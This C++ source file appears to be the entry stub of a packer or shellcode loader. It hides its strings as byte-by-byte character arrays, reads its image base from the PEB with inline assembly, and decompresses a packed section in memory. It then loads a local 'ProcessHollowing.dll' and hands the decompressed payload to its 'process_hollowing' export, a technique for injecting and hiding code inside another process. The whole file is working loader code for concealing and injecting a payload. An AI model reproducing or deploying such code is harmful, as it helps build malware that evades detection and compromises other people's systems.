#include "..\..\shellcodecore\core.h"
#include <compressapi.h>
#include <intrin.h>
#pragma intrinsic( _ReturnAddress )
#define getVA(image_base,rva) (image_base + (ULONG_PTR)rva)
typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;
typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;
typedef struct workspace
{
	enum { workspace_size = 10, path_log_size = 31};
	char* table[workspace_size];
	char*& path_log = table[0];
	char*& log_message = table[1];
	char*& str_size_decompressor = table[2];
	char*& name_acmdln = table[3];
	char*& name_wcmdln = table[4];
	char*& dll_path = table[5];
	char*& name_proc = table[6];
	char*& name_section = table[7];
	char*& ptr_i = table[8];
	char*& ptr_j = table[9];
	const msvc& ref_msvc;
	workspace(msvc& ref) :ref_msvc(ref)
	{

		ref_msvc.memset(this->table, 0, workspace_size * sizeof(char*));
#pragma region path_log
		this->path_log = (char*)ref_msvc.malloc(path_log_size);
		path_log[0] = 67;
		path_log[1] = 58;
		path_log[2] = 47;
		path_log[3] = 85;
		path_log[4] = 115;
		path_log[5] = 101;
		path_log[6] = 114;
		path_log[7] = 115;
		path_log[8] = 47;
		path_log[9] = 50;
		path_log[10] = 51;
		path_log[11] = 48;
		path_log[12] = 51;
		path_log[13] = 53;
		path_log[14] = 47;
		path_log[15] = 68;
		path_log[16] = 101;
		path_log[17] = 115;
		path_log[18] = 107;
		path_log[19] = 116;
		path_log[20] = 111;
		path_log[21] = 112;
		path_log[22] = 47;
		path_log[23] = 108;
		path_log[24] = 111;
		path_log[25] = 103;
		path_log[26] = 46;
		path_log[27] = 116;
		path_log[28] = 120;
		path_log[29] = 116;
		path_log[30] = 0;
#pragma endregion
#pragma region log_message
		this->log_message = (char*)ref_msvc.malloc(31);
		log_message[0] = 73;
		log_message[1] = 110;
		log_message[2] = 105;
		log_message[3] = 116;
		log_message[4] = 32;
		log_message[5] = 83;
		log_message[6] = 117;
		log_message[7] = 99;
		log_message[8] = 99;
		log_message[9] = 101;
		log_message[10] = 115;
		log_message[11] = 115;
		log_message[12] = 101;
		log_message[13] = 100;
		log_message[14] = 32;
		log_message[15] = 119;
		log_message[16] = 105;
		log_message[17] = 116;
		log_message[18] = 104;
		log_message[19] = 32;
		log_message[20] = 76;
		log_message[21] = 111;
		log_message[22] = 103;
		log_message[23] = 115;
		log_message[24] = 116;
		log_message[25] = 114;
		log_message[26] = 101;
		log_message[27] = 97;
		log_message[28] = 109;
		log_message[29] = 33;
		log_message[30] = 0;
#pragma endregion
#pragma region size_decompressor
		this->str_size_decompressor = (char*)ref_msvc.malloc(17);
		str_size_decompressor[0] = 100;
		str_size_decompressor[1] = 101;
		str_size_decompressor[2] = 99;
		str_size_decompressor[3] = 111;
		str_size_decompressor[4] = 109;
		str_size_decompressor[5] = 112;
		str_size_decompressor[6] = 114;
		str_size_decompressor[7] = 101;
		str_size_decompressor[8] = 115;
		str_size_decompressor[9] = 115;
		str_size_decompressor[10] = 32;
		str_size_decompressor[11] = 115;
		str_size_decompressor[12] = 105;
		str_size_decompressor[13] = 122;
		str_size_decompressor[14] = 101;
		str_size_decompressor[15] = 58;
		str_size_decompressor[16] = 0;
#pragma endregion
#pragma region _acmdline
		name_acmdln = (char*)ref_msvc.malloc(8);
		name_acmdln[0] = 95;
		name_acmdln[1] = 97;
		name_acmdln[2] = 99;
		name_acmdln[3] = 109;
		name_acmdln[4] = 100;
		name_acmdln[5] = 108;
		name_acmdln[6] = 110;
		name_acmdln[7] = 0;
#pragma endregion
#pragma region wcmdline
		name_wcmdln = (char*)ref_msvc.malloc(8);
		name_wcmdln[0] = 95;
		name_wcmdln[1] = 119;
		name_wcmdln[2] = 99;
		name_wcmdln[3] = 109;
		name_wcmdln[4] = 100;
		name_wcmdln[5] = 108;
		name_wcmdln[6] = 110;
		name_wcmdln[7] = 0;
#pragma endregion
#pragma region dll_path
		dll_path = (char*)ref_msvc.malloc(68);
		dll_path[0] = 67;
		dll_path[1] = 58;
		dll_path[2] = 92;
		dll_path[3] = 85;
		dll_path[4] = 115;
		dll_path[5] = 101;
		dll_path[6] = 114;
		dll_path[7] = 115;
		dll_path[8] = 92;
		dll_path[9] = 50;
		dll_path[10] = 51;
		dll_path[11] = 48;
		dll_path[12] = 51;
		dll_path[13] = 53;
		dll_path[14] = 92;
		dll_path[15] = 68;
		dll_path[16] = 101;
		dll_path[17] = 115;
		dll_path[18] = 107;
		dll_path[19] = 116;
		dll_path[20] = 111;
		dll_path[21] = 112;
		dll_path[22] = 92;
		dll_path[23] = 72;
		dll_path[24] = 111;
		dll_path[25] = 109;
		dll_path[26] = 101;
		dll_path[27] = 92;
		dll_path[28] = 67;
		dll_path[29] = 43;
		dll_path[30] = 43;
		dll_path[31] = 92;
		dll_path[32] = 65;
		dll_path[33] = 100;
		dll_path[34] = 100;
		dll_path[35] = 83;
		dll_path[36] = 104;
		dll_path[37] = 101;
		dll_path[38] = 108;
		dll_path[39] = 108;
		dll_path[40] = 92;
		dll_path[41] = 68;
		dll_path[42] = 101;
		dll_path[43] = 98;
		dll_path[44] = 117;
		dll_path[45] = 103;
		dll_path[46] = 92;
		dll_path[47] = 80;
		dll_path[48] = 114;
		dll_path[49] = 111;
		dll_path[50] = 99;
		dll_path[51] = 101;
		dll_path[52] = 115;
		dll_path[53] = 115;
		dll_path[54] = 72;
		dll_path[55] = 111;
		dll_path[56] = 108;
		dll_path[57] = 108;
		dll_path[58] = 111;
		dll_path[59] = 119;
		dll_path[60] = 105;
		dll_path[61] = 110;
		dll_path[62] = 103;
		dll_path[63] = 46;
		dll_path[64] = 100;
		dll_path[65] = 108;
		dll_path[66] = 108;
		dll_path[67] = 0;
#pragma endregion
#pragma region name_proc
		name_proc = (char*)ref_msvc.malloc(18);
		name_proc[0] = 112;
		name_proc[1] = 114;
		name_proc[2] = 111;
		name_proc[3] = 99;
		name_proc[4] = 101;
		name_proc[5] = 115;
		name_proc[6] = 115;
		name_proc[7] = 95;
		name_proc[8] = 104;
		name_proc[9] = 111;
		name_proc[10] = 108;
		name_proc[11] = 108;
		name_proc[12] = 111;
		name_proc[13] = 119;
		name_proc[14] = 105;
		name_proc[15] = 110;
		name_proc[16] = 103;
		name_proc[17] = 0;
#pragma endregion
#pragma region name_section
		name_section = (char*)ref_msvc.malloc(7);
		name_section[0] = 46;
		name_section[1] = 114;
		name_section[2] = 101;
		name_section[3] = 108;
		name_section[4] = 111;
		name_section[5] = 99;
		name_section[6] = 0;
#pragma endregion
	}
	~workspace()
	{
		int counter = workspace_size;
		while (counter--)
		{
			if (table[counter] == nullptr)
				continue;
			else
			{
				ref_msvc.free(table[counter]);
			}
		}
	}
}workspace;
extern "C" int entry()
{
#pragma region typedef
	typedef typename PBASE_RELOCATION_BLOCK ptr_block_relocation;
	typedef typename BASE_RELOCATION_BLOCK block_relocation;
	typedef typename BASE_RELOCATION_ENTRY entry_relocation;
	typedef typename PBASE_RELOCATION_ENTRY ptr_entry_relocatin;
	typedef typename ULONG_PTR uint32_ptr;
	typedef typename LONG_PTR int32_ptr;
	typedef typename DWORD uint32_t;
	typedef typename BYTE byte;
	typedef typename unsigned long size_t;
	typedef typename PIMAGE_DOS_HEADER p_dos_header;
	typedef typename PIMAGE_NT_HEADERS p_nt_header;
	typedef typename PIMAGE_SECTION_HEADER ptr_section_header;
	typedef typename IMAGE_DATA_DIRECTORY directory_data;
	typedef typename PIMAGE_IMPORT_DESCRIPTOR ptr_descrptor_import;
	typedef typename HMODULE hmodule;
	typedef typename PIMAGE_THUNK_DATA ptr_thunk_data;
#pragma endregion
	typedef struct paramter
	{
		void* image_base;
		unsigned long compressed_size;
	}paramter;
	uint32_ptr image_base;
	p_dos_header ptr_DosHdr;
	p_nt_header ptr_NtHdr;
	ptr_section_header ptr_SecHdr;

	DECOMPRESSOR_HANDLE hand_decompressor;
	BOOL bRes;
	size_t size_decompressor;





	kernel kernel;
	msvc msvc(kernel);
	cabinet cabinet(kernel);
	workspace workspace(msvc);
	logstream logstream(msvc, workspace.path_log);
	logstream << workspace.log_message;

	//get the imagebase;
	__asm
	{
		push ebx
		mov ebx, fs:0x30
		mov ebx, [ebx + 0x08]
		mov image_base, ebx
		pop ebx
	}
	ptr_DosHdr = reinterpret_cast<p_dos_header>(image_base);
	//get the address of NtHeader
	ptr_NtHdr = reinterpret_cast<p_nt_header>(image_base + ptr_DosHdr->e_lfanew);
	//get the address of SectionHeader
	ptr_SecHdr = reinterpret_cast<ptr_section_header>(ptr_NtHdr->FileHeader.SizeOfOptionalHeader + (uint32_ptr)&ptr_NtHdr->OptionalHeader);

	bRes = cabinet.CreateDecompressor(COMPRESS_ALGORITHM_MSZIP, NULL, &hand_decompressor);

	cabinet.Decompress(hand_decompressor, (void*)getVA(image_base, ptr_SecHdr[1].VirtualAddress), ptr_SecHdr[1].PointerToRelocations, NULL, NULL, &size_decompressor);


	/*dynamic alloc heap memory by msvc.malloc */
	/*char* buffer_decompressed = new char[size_decompressor]{};*/
	char* buffer_decompressed = static_cast<char*>(msvc.malloc(size_decompressor));

	/*workspace died will free all ptr*/
	workspace.ptr_j = buffer_decompressed;

	cabinet.Decompress(hand_decompressor, (void*)getVA(image_base, ptr_SecHdr[1].VirtualAddress), ptr_SecHdr[1].SizeOfRawData, buffer_decompressed, size_decompressor, &size_decompressor);

	logstream << workspace.str_size_decompressor << size_decompressor;
	logstream.flush();
	ptr_section_header lpImpSecHdr = ptr_SecHdr;

	HMODULE hModule = kernel.LoadLibraryA(workspace.dll_path);
	void* address_proc =  kernel.GetProcAddress(hModule, workspace.name_proc);
	__asm
	{
		push eax
		push size_decompressor
		push buffer_decompressed
		mov eax,address_proc
		call eax 
		pop eax
	}
	return 0;
}


